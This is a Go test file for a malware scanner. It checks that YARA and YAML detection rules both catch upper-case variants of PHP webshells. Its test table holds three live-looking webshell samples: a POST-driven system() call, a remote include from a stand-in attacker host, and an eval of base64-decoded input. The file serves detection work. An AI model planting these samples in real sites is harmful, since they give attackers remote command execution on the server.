//go:build yara

package yara_test

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"

	"github.com/pidginhost/csm/internal/signatures"
	csmyara "github.com/pidginhost/csm/internal/yara"
)

// PHP resolves function names, include/require and the open tag without
// regard to case, and the YAML loader compiles every regex case-insensitively.
// Three YARA twins carried no `nocase`, so a shell written in upper case was
// caught by the realtime engine and missed by every scan and re-check.
func TestRepositoryRulesMatchCaseVariantsInBothEngines(t *testing.T) {
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")
	yaraScanner, err := csmyara.NewScanner(configsDir)
	if err != nil {
		t.Fatalf("loading YARA rules: %v", err)
	}
	yamlScanner := signatures.NewScanner(configsDir)
	if err := yamlScanner.LoadError(); err != nil {
		t.Fatalf("loading YAML rules: %v", err)
	}

	tests := []struct {
		rule   string
		sample string
	}{
		{
			rule:   "obfuscation_variable_function",
			sample: `<?php $f = "SYSTEM"; $f($_POST['c']);`,
		},
		{
			rule:   "dropper_rfi_include",
			sample: `<?php Include_once("http://evil.example/x.txt");`,
		},
		{
			rule:   "webshell_encoded_eval_oneline",
			sample: `<?PHP EVAL(BASE64_DECODE("` + repeatBase64(120) + `"));`,
		},
	}
	for _, tc := range tests {
		t.Run(tc.rule, func(t *testing.T) {
			target := filepath.Join(t.TempDir(), "sample.php")
			if err := os.WriteFile(target, []byte(tc.sample), 0o644); err != nil {
				t.Fatal(err)
			}
			if !hasSignatureRule(yamlScanner.ScanFile(target, 1<<20), tc.rule) {
				t.Fatalf("YAML rule %s does not match the upper-case sample", tc.rule)
			}
			if !hasRepositoryYaraRule(yaraScanner.ScanBytes([]byte(tc.sample)), tc.rule) {
				t.Fatalf("YARA rule %s misses the upper-case sample the YAML twin catches", tc.rule)
			}
		})
	}
}

func repeatBase64(n int) string {
	const alphabet = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0MTIzNDU2Nzg5"
	out := ""
	for len(out) < n {
		out += alphabet
	}
	return out[:n]
}
